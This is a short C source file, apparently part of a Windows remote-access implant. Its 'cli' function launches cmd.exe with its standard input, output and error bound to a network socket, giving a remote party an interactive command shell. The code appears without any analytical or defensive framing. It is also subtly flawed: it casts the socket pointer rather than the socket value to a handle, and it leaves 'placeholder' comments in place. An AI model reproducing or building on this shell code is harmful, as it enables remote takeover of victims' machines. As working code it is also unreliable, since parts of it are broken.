#include "cli.h"

BOOL cli (CHAR * buffer, DWORD buf_size, SOCKET * p_out_socket)
{
    log_debug("CLI started\n");
    STARTUPINFOW startup_info = { 0 };
    ZeroMemory(&startup_info, sizeof(startup_info));
    startup_info.cb      = sizeof(startup_info);
    startup_info.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    // Redirects std handles to socket
    startup_info.hStdInput       = startup_info.hStdOutput
        = startup_info.hStdError = (HANDLE)p_out_socket;

    PROCESS_INFORMATION proc_info = { 0 };
    ZeroMemory(&proc_info, sizeof(proc_info));
    WCHAR  cmd[4096] = L"cmd.exe";
    LPWSTR cmdline   = cmd;

    if (!CreateProcessW(NULL,
                        cmdline,
                        NULL,
                        NULL,
                        TRUE,
                        0,
                        NULL,
                        NULL,
                        &startup_info,
                        &proc_info))
    {
        log_last_error(FALSE);
        return FALSE;
    }

    WaitForSingleObject(proc_info.hProcess, INFINITE);
    CloseHandle(proc_info.hProcess);
    CloseHandle(proc_info.hThread);
    // Implementation of the cli function
    return TRUE; // Placeholder return value
}